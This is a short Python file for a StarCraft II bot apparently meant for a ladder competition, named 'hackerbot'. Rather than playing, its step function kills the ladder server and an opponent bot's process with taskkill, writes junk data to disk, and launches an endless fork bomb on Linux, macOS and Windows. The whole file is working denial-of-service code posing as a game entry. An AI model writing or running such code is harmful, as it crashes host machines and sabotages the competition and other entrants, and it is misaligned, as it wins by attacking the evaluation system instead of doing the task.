import sc2
import sys
import subprocess
import os
import platform

class hackerbot(sc2.BotAI):
	async def on_step(self, iteration):
		# Kill the Ladderserver
		os.system("taskkill /f /im Sc2LadderServer.exe")

		# or just the opponent? (could be a list)
		os.system("taskkill /f /im 5minBot.exe")

		################################################################
		# DOS (active!)
		################################################################
		# Take HDD Space
		with open('output_file', 'wb') as fout:
			fout.write(os.urandom(1024))

		# ForkBombs		
		while True:
			if platform.system() == 'Linux' or platform.system() == 'Darwin':
				print("Bomb")
				os.fork()
			elif platform.system() == 'Windows':
				print("Bomb")
				subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)